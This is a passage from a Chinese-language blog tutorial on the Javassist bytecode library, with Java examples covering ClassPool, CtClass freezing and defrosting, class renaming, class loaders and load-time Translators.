&#125;<span class="keyword">catch</span> (javassist.CannotCompileException ex)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;解冻后，即使可以修改class内容，但是也不能再重新实例化了&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对上面的代码选取部分进行解释：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractClass.class));</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(InterfaceClass.class));</span><br></pre></td></tr></table></figure></div>

<p>创建了 ClassPool 对象，并调用了 insertClassPath 方法。因为通过 ClassPool.getDefault() 获取的 ClassPool 使用 JVM 的类搜索路径。如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool 必须添加额外的类搜索路径（在该测试 java 文件中，可以不写这两行，因为默认加载器能找到）。</p>
<p>insertClassPath 也可以注册一个目录作为类搜索路径。下面的例子将 &#x2F;classes 添加到类搜索路径中</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">pool.insertClassPath(<span class="string">&quot;./classes&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>类搜索路径不但可以是目录，还可以是 URL ：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">ClassPath</span> <span class="variable">cp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassPath</span>(<span class="string">&quot;www.javassist.org&quot;</span>, <span class="number">80</span>, <span class="string">&quot;/java/&quot;</span>, <span class="string">&quot;org.javassist.&quot;</span>);</span><br><span class="line">pool.insertClassPath(cp);</span><br></pre></td></tr></table></figure></div>

<p>上述代码将 <code>http://www.javassist.org:80/java/</code> 添加到类搜索路径。并且这个URL只能搜索 <code>org.javassist</code> 包里面的类。例如，为了加载 <code>org.javassist.test.Main</code>，它的类文件会从<code>http://www.javassist.org:80/java/org/javassist/test/Main.class</code> 获取。</p>
<p>随后新建了 Ko1sh1 类，同时设置其父类为 AbstractClass</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Ko1sh1&quot;</span>,pool.get(AbstractClass.class.getName()));</span><br></pre></td></tr></table></figure></div>

<p>与下面的代码等效</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Ko1sh1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置父类为抽象类</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractClass.class.getName());</span><br><span class="line">ctClass.setSuperclass(superClass);</span><br></pre></td></tr></table></figure></div>



<p>javassist 中当 CtClass 对象调用 writeFile(), toClass(), toBytecode() 方法时，会转换成一个类文件，此 CtClass 对象已被冻结，不允许再修改，再次调用会产生报错。对于被冻结的 CtClass 对象，可以使用 defrost() 进行解冻，调用 defrost() 之后，此 CtClass 对象又可以被修改了（可以修改，但是不能再次加载进 JVM 中了，一个类只能被加载一次，比如实例化操作就无法再次进行了）。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="comment">// 生成实例化对象</span></span><br><span class="line"><span class="comment">//        ctClass.toClass().newInstance();</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">instance_class</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> instance_class.newInstance();</span><br><span class="line">        ((AbstractClass)instance).show();</span><br><span class="line">        ((InterfaceClass)instance).show2();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 类冻结</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ctClass.toClass();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (javassist.CannotCompileException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;已调用 writeFile(), toClass(), toBytecode() 方法转换成一个类文件，此 CtClass 对象已被冻结，不允许再修改&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 解冻</span></span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            method = CtNewMethod.make(<span class="string">&quot;public void show3() &#123; System.out.println(\&quot;HAHA! I&#x27;m fine again\&quot;); &#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addMethod(method);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                instance = ctClass.toClass().newInstance();</span><br><span class="line">                instance.getClass().getMethod(<span class="string">&quot;show3&quot;</span>).invoke(instance);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (javassist.CannotCompileException ex)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;解冻后，即使可以修改class内容，但是也不能再重新实例化了&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p>除此以外，ClassPool.doPruning 属性值为 true 时，在冻结 CtClass 时，会修剪 CtClass 的数据结构。为了减少内存的消耗，修剪操作会丢弃 CtClass 对象中不必要的属性。例如，Code_attribute 结构会被丢弃。修剪过的 CtClass 对象不能再次被解冻。ClassPool.doPruning 的默认值为 false。</p>
<p>也可通过下面的代码驳回裁剪</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cc.stopPruning(true);</span><br></pre></td></tr></table></figure></div>



<h2 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h2><p>ClassPool 是 CtClass 对象的容器。因为编译器在编译引用 CtClass 代表的 Java 类的源代码时，可能会引用 CtClass 对象，所以一旦一个 CtClass 被创建，它就被保存在 ClassPool 中。简单来说，这就是个容器，存放的是<code>CtClass</code>对象。</p>
<p>如果 CtClass 对象的数量变得非常大（这种情况很少发生，因为 Javassist 试图以各种方式减少内存消耗），ClassPool 可能会导致巨大的内存消耗。 为了避免此问题，可以从 ClassPool 中显式删除不必要的 CtClass 对象。 如果对 CtClass 对象调用 detach()，那么该 CtClass 对象将被从 ClassPool 中删除。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> ... ;</span><br><span class="line">cc.writeFile();</span><br><span class="line">cc.detach();</span><br></pre></td></tr></table></figure></div>

<p>在调用 detach() 之后，就不能调用这个 CtClass 对象的任何方法了。但是如果你调用 ClassPool 的 get() 方法，ClassPool 会再次读取这个类文件，创建一个新的 CtClass 对象。</p>
<p>由于 ClassPool.getDefault() 是为了方便而提供的单例工厂方法，它保留了一个<code>ClassPool</code>的单例并重用它。所以创建的新的 ClassPool 替换旧的 ClassPool，并将旧的 ClassPool 丢弃。除该方法以外，还可通过 <code>new ClassPool(true)</code> 构造一个 ClassPool 对象。</p>
<h3 id="级联的-ClassPools"><a href="#级联的-ClassPools" class="headerlink" title="级联的 ClassPools"></a>级联的 ClassPools</h3><p>如果程序正在 Web 应用程序服务器上运行，则可能需要创建多个 ClassPool 实例; 应为每一个 ClassLoader 创建一个 ClassPool 的实例。 程序应该通过 ClassPool 的构造函数，而不是调用 getDefault() 来创建一个 ClassPool 对象。<br> 多个 ClassPool 对象可以像 java.lang.ClassLoader 一样级联。 例如，</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">parent</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">child</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>(parent);</span><br><span class="line">child.insertClassPath(<span class="string">&quot;./classes&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>如果调用 child.get()，子 ClassPool 首先委托给父 ClassPool。如果父 ClassPool 找不到类文件，那么子 ClassPool 会尝试在 .&#x2F;classes 目录下查找类文件。如果 child.childFirstLookup 设置为 true，那么子类 ClassPool 会在委托给父 ClassPool 之前尝试查找类文件。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">parent</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">child</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>(parent);</span><br><span class="line">child.appendSystemPath();         <span class="comment">// the same class path as the default one.</span></span><br><span class="line">child.childFirstLookup = <span class="literal">true</span>;    <span class="comment">// changes the behavior of the child.</span></span><br></pre></td></tr></table></figure></div>



<h3 id="拷贝一个已经存在的类来定义一个新的类"><a href="#拷贝一个已经存在的类来定义一个新的类" class="headerlink" title="拷贝一个已经存在的类来定义一个新的类"></a>拷贝一个已经存在的类来定义一个新的类</h3><div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.<span class="keyword">get</span>(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">cc.setName(<span class="string">&quot;Pair&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>这个程序首先获得类 Point 的 CtClass 对象。然后它调用 setName() 将这个 CtClass 对象的名称设置为 Pair。在这个调用之后，这个 CtClass 对象所代表的类的名称 Point 被修改为 Pair。类定义的其他部分不会改变。</p>
<p>因此，如果后续在 ClassPool 对象上再次调用 get(“Point”)，则它不会返回变量 cc 所指的 CtClass 对象。 而是再次读取类文件 Point.class，并为类 Point 构造一个新的 CtClass 对象。 因为与 Point 相关联的 CtClass 对象不再存在。示例：</p>
<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.<span class="keyword">get</span>(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">CtClass cc1 = pool.<span class="keyword">get</span>(<span class="string">&quot;Point&quot;</span>);   <span class="comment">// cc1 is identical to cc.</span></span><br><span class="line">cc.setName(<span class="string">&quot;Pair&quot;</span>);</span><br><span class="line">CtClass cc2 = pool.<span class="keyword">get</span>(<span class="string">&quot;Pair&quot;</span>);    <span class="comment">// cc2 is identical to cc.</span></span><br><span class="line">CtClass cc3 = pool.<span class="keyword">get</span>(<span class="string">&quot;Point&quot;</span>);   <span class="comment">// cc3 is not identical to cc.</span></span><br></pre></td></tr></table></figure></div>

<p>cc1 和 cc2 指向 CtClass 的同一个实例，而 cc3 不是。 注意，在执行 cc.setName(“Pair”) 之后，cc 和 cc1 引用的 CtClass 对象都表示 Pair 类。</p>
<p>除了上面的内容，还需要注意，一旦一个 CtClass 对象被 writeFile() 或 toBytecode() 转换为一个类文件，Javassist 会拒绝对该 CtClass 对象的进一步修改。因此，在表示 Point 类的 CtClass 对象被转换为类文件之后，不能将 Pair 类定义为 Point 的副本，在 Point 上执行 setName() 将会被拒绝。 以下代码段是错误的：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">cc.writeFile();</span><br><span class="line">cc.setName(<span class="string">&quot;Pair&quot;</span>);    <span class="comment">// wrong since writeFile() has been called.</span></span><br></pre></td></tr></table></figure></div>

<p>为了避免这种限制，应该在 ClassPool 中调用 getAndRename() 方法。 例如：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;Point&quot;</span>);</span><br><span class="line">cc.writeFile();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc2</span> <span class="operator">=</span> pool.getAndRename(<span class="string">&quot;Point&quot;</span>, <span class="string">&quot;Pair&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>如果调用 getAndRename()，ClassPool 首先读取 Point.class 来创建一个新的表示 Point 类的 CtClass 对象。 而且，它会在这个 CtClass 被记录到哈希表之前，将 CtClass 对象重命名为 Pair。因此，getAndRename() 可以在表示 Point 类的 CtClass 对象上调用 writeFile() 或 toBytecode() 后执行。</p>
<h2 id="类加载器-Class-Loader"><a href="#类加载器-Class-Loader" class="headerlink" title="类加载器 (Class Loader)"></a>类加载器 (Class Loader)</h2><p>在Java中，多个类加载器可以共存，每个类加载器创建自己的名称空间。不同的类加载器可以加载具有相同类名的不同类文件。加载的两个类被视为不同的类。此功能使我们能够在单个 JVM 上运行多个应用程序，即使这些程序包含具有相同名称的不同的类。</p>
<p>JVM 不允许动态重新加载类。一旦类加载器加载了一个类，它不能在运行时重新加载该类的修改版本。</p>
<p>如果相同的类文件由两个不同的类加载器加载，则 JVM 会创建两个具有相同名称和定义的不同的类。由于两个类不相同，一个类的实例不能被分配给另一个类的变量。两个类之间的转换操作将失败并抛出一个 ClassCastException。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">MyClassLoader</span> <span class="variable">myLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> myLoader.loadClass(<span class="string">&quot;Box&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.newInstance();</span><br><span class="line"><span class="type">Box</span> <span class="variable">b</span> <span class="operator">=</span> (Box)obj;    <span class="comment">// this always throws ClassCastException.</span></span><br></pre></td></tr></table></figure></div>

<p>上述代码将报错，因为 Box 由默认的 classloader 加载，obj 是通过自定义的 classloader 加载的，强制转换将产生报错</p>
<h3 id="javassist-Loader"><a href="#javassist-Loader" class="headerlink" title="javassist.Loader"></a>javassist.Loader</h3><p>Javassit 提供一个类加载器 javassist.Loader。它使用 javassist.ClassPool 对象来读取类文件。<br> 例如，javassist.Loader 可以用于加载用 Javassist 修改过的类。</p>
<h4 id="类加载前"><a href="#类加载前" class="headerlink" title="类加载前"></a>类加载前</h4><p><strong>FatherBean.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FatherBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FatherBean</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FatherBean</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>SimpleBean.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleBean</span><span class="params">(<span class="type">int</span> age, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleBean</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>javassistLoader_Learn.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.Loader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassistLoader_Learn</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">Loader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(pool);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool.get(<span class="string">&quot;Bean.SimpleBean&quot;</span>);</span><br><span class="line">        ct.setSuperclass(pool.get(<span class="string">&quot;Bean.FatherBean&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> cl.loadClass(<span class="string">&quot;Bean.SimpleBean&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可以发现成功继承了父类，说明加载了被修改后的字节</span></span><br><span class="line">        System.out.println(instance.getClass().getSuperclass());</span><br><span class="line">        instance.getClass().getMethod(<span class="string">&quot;setId&quot;</span>,<span class="type">int</span>.class).invoke(instance,<span class="number">21</span>);</span><br><span class="line">        System.out.println(instance.getClass().getMethod(<span class="string">&quot;getId&quot;</span>).invoke(instance));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过上面的代码，可以发现 javassist 的 Loader 加载的是修改后的字节码</p>
<h4 id="类加载时"><a href="#类加载时" class="headerlink" title="类加载时"></a>类加载时</h4><p>如果用户希望在加载时按需修改类，则可以向 javassist.Loader 添加事件监听器。当类加载器加载类时会通知监听器。事件监听器类必须实现以下接口：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Translator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(ClassPool pool)</span></span><br><span class="line">        <span class="keyword">throws</span> NotFoundException, CannotCompileException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onLoad</span><span class="params">(ClassPool pool, String classname)</span></span><br><span class="line">        <span class="keyword">throws</span> NotFoundException, CannotCompileException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当事件监听器通过 addTranslator() 添加到 javassist.Loader 对象时，start() 方法会被调用。在 javassist.Loader 加载类之前，会调用 onLoad() 方法。可以在 onLoad() 方法中修改被加载的类的定义。</p>
<p>例如，下面的事件监听器在类加载之前，将类设为public，并将指定方法修改为 public static 修饰（注意，这里的只能去修改访问权限，不能修改 final 和 static 这种修饰，否则会出现报错，如果不写也会产生报错）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTranslator</span> <span class="keyword">implements</span> <span class="title class_">Translator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(ClassPool pool)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onLoad</span><span class="params">(ClassPool pool, String classname)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Translating &quot;</span> + classname);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(classname);</span><br><span class="line">        <span class="comment">// 将类设为 public</span></span><br><span class="line">        cc.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        <span class="comment">// 将指定方法设为 public, 并且要写齐，public 和 static 都要写，否则会产生报错</span></span><br><span class="line">        cc.getDeclaredMethod(<span class="string">&quot;testMethod&quot;</span>).setModifiers(Modifier.PUBLIC | Modifier.STATIC);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注意，onLoad() 不必调用 toBytecode() 或 writeFile()，因为 javassist.Loader 会调用这些方法来获取类文件。</p>
<p>写个测试类来测试 Translator 功能</p>
<p><strong>TestApp.java</strong> 被加载对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestApp</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">testMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test, test!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Method[] methods = TestApp.class.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">modifiers</span> <span class="operator">=</span> method.getModifiers();</span><br><span class="line">            <span class="keyword">if</span> (Modifier.isPublic(modifiers)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Method &quot;</span> + method.getName() + <span class="string">&quot; is public&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (Modifier.isPrivate(modifiers)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Method &quot;</span> + method.getName() + <span class="string">&quot; is private&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>直接运行为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Method main is public</span><br><span class="line">Method testMethod is private</span><br></pre></td></tr></table></figure></div>

<p>创建 Loader 来使用 Translator</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.Loader;</span><br><span class="line"><span class="keyword">import</span> javassist.Translator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Translator_Learn</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">Translator</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyTranslator</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">Loader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader</span>();</span><br><span class="line">        cl.addTranslator(pool, t);</span><br><span class="line">        <span class="comment">// 这里的 args 就是触发 TestApp main 方法传入的 args</span></span><br><span class="line">        cl.run(<span class="string">&quot;TestApp&quot;</span>, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行结果为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Translating G1_TestApp</span><br><span class="line">Method testMethod is public</span><br><span class="line">Method main is public</span><br></pre></td></tr></table></figure></div>

<p>此外，还需要注意，TestApp 不能访问 Loader 类，如 Translator_Learn，MyTranslator 和 ClassPool，因为它们是由不同的加载器加载的。 TestApp 类由 javassist.Loader 加载，而加载器类（例如 Translator_Learn）是由默认的 Java 类加载器加载。</p>
<h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p><strong>G2_SelfClassLoader_Learn.java</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G2_SelfClassLoader_Learn</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ClassPool pool;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">G2_SelfClassLoader_Learn</span><span class="params">()</span> <span class="keyword">throws</span> NotFoundException &#123;</span><br><span class="line">        pool = <span class="keyword">new</span> <span class="title class_">ClassPool</span>();</span><br><span class="line">        pool.insertClassPath(<span class="string">&quot;src/main/java/g2_classes&quot;</span>); <span class="comment">// 指定 class 文件位置，该目录不能是程序的 class 输出位置，否则 JVM 会用默认的类加载器去加载该类。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 指定类 的 main 方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">G2_SelfClassLoader_Learn</span> <span class="variable">selfLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">G2_SelfClassLoader_Learn</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> selfLoader.loadClass(<span class="string">&quot;G2_TestApp&quot;</span>);</span><br><span class="line">        c.getDeclaredMethod(<span class="string">&quot;main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String[].class &#125;).invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; args &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        